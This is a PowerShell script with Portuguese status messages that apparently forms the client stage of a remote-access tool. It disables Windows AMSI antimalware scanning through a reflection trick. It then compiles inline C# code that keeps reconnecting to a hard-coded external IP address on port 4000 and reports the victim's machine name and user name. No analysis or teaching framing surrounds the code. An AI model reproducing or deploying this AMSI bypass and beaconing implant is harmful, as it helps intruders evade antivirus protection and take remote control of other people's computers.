$serverIP = "198.1.195.204"
$serverPort = 4000
Write-Host "Iniciando teste..." -ForegroundColor Yellow
$amsi = [Ref].Assembly.GetType('System.Management.Automation.AmsiUtils')
if ($amsi) { $amsi.GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true) }
Write-Host "Compilando C#..." -ForegroundColor Cyan
Add-Type -ReferencedAssemblies System.Windows.Forms, System.Drawing @"
using System;
using System.Drawing;
using System.IO;
using System.Text;
using System.Threading;
using System.Net.Sockets;
using System.Windows.Forms;
using System.Diagnostics;

public class R9KAgent {
    [System.Runtime.InteropServices.DllImport("user32.dll")] public static extern bool SetProcessDPIAware();
    public static void Start(string ip, int port) {
        try { SetProcessDPIAware(); } catch {}
        Console.WriteLine("[C#] Tentando conectar em " + ip + ":" + port + "...");
        while (true) {
            try {
                TcpClient myClient = new TcpClient();
                myClient.Connect(ip, port);
                Console.WriteLine("[C#] CONECTOU! Enviando BANNER...");
                NetworkStream myStream = myClient.GetStream();
                StreamWriter myWriter = new StreamWriter(myStream, new UTF8Encoding(false));
                myWriter.AutoFlush = true;
                myWriter.WriteLine("BANNER:" + Environment.MachineName + "@" + Environment.UserName + "|1920|1080|True");
                while (myClient.Connected) { Thread.Sleep(1000); }
            } catch (Exception ex) {
                Console.WriteLine("[C#] Erro: " + ex.Message);
                Thread.Sleep(3000);
            }
        }
    }
}
"@
Write-Host "C# Compilado. Chamando Start..." -ForegroundColor Green
[R9KAgent]::Start($serverIP, $serverPort)
